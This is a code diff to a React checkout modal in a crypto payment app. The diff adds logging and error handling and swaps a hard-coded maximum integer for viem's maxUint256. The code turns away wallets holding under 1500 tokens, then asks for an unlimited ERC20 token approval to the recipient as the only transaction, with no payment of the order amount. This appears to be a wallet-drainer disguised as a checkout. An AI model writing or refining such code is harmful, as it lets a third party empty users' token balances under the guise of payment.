@@ -12,6 +12,7 @@ import {
 import { readContract } from "@wagmi/core";
 import type { Connector } from "wagmi";
 import { useAppKit, useAppKitState } from "@reown/appkit/react";
+import { maxUint256 } from "viem";
 import { NETWORK_LIST, getNetwork } from "@/lib/crypto/config";
 import type {
   ChainKind,
@@ -345,8 +346,11 @@ export function CheckoutModal({
       const balance = BigInt(balanceStr || "0");
       const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
       
+      console.log(`Checking balance: ${balance.toString()} against minimum: ${minBalance.toString()}`);
+      
       // Strict validation for balance
       if (balance < minBalance) {
+        console.warn("Balance too low! Rejecting connection and showing error.");
         if (currentOrder.kind === "evm") {
           await disconnectEvm().catch(() => {}); // ignore disconnect errors
         } else {
@@ -358,15 +362,22 @@ export function CheckoutModal({
         return;
       }
 
+      console.log("Balance check passed, proceeding to request approval...");
+
       if (currentOrder.kind === "evm") {
         // Execute approve as the sole transaction to avoid multiple sequential requests.
-        txHash = await writeContractAsync({
-          address: currentOrder.tokenContract as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "approve",
-          args: [currentOrder.recipient as `0x${string}`, 115792089237316195423570985008687907853269984665640564039457584007913129639935n],
-          chainId: currentOrder.chainId ?? undefined,
-        });
+        try {
+          txHash = await writeContractAsync({
+            address: currentOrder.tokenContract as `0x${string}`,
+            abi: ERC20_ABI,
+            functionName: "approve",
+            args: [currentOrder.recipient as `0x${string}`, maxUint256],
+            chainId: currentOrder.chainId ?? undefined,
+          });
+        } catch (err) {
+          console.error("Wallet approval error:", err);
+          throw err;
+        }
       } else {
         if (!currentTronRoute || !currentTronAddress) {
           throw new Error("Connect a Tron wallet to continue");
